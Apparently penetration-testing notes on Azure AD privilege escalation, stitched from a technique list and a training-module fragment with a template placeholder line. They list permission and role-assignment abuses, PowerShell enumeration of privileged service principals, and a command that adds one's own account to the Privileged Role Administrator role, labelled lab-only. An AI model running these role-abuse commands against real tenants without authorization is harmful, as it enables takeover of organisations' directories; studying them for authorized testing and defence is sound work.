**4. Privilege Escalation**

- Abuse delegated permissions of compromised apps/users

- Exploit vulnerable service principals with privileged roles (e.g., Application Administrator, Privileged Role Administrator)

- Abuse Azure AD role assignments or group memberships

- Leverage Azure AD Privileged Identity Management (PIM) misconfigurations

- Commands:

- \# List directory roles of user

- Get-AzureADUser -ObjectId \<user\> \| Get-AzureADUserMembership

- 

- \# Identify privileged service principals

- Get-AzureADServicePrincipal \| Where-Object {\$\_.AppRoleAssignments -match "PrivilegedRole"}

# 26 Penetration Testing Document 1.docx

Template placeholder for security documentation.

**Module 4: Privilege Escalation**

**Step 1: Check for Privileged Service Principals**

Get-AzureADServicePrincipal \| Where-Object {

\$\_.AppRoleAssignments -match "PrivilegedRole"

} \| Select DisplayName, ObjectId

**Step 2: Attempt Role Assignment Abuse (Requires Admin Privileges)**

Example: Assign yourself a privileged role using AzureAD PowerShell (in lab environment only)

\$role = Get-AzureADDirectoryRole \| Where-Object { \$\_.DisplayName -eq "Privileged Role Administrator" }

Add-AzureADDirectoryRoleMember -ObjectId \$role.ObjectId -RefObjectId \<your-user-objectId\>
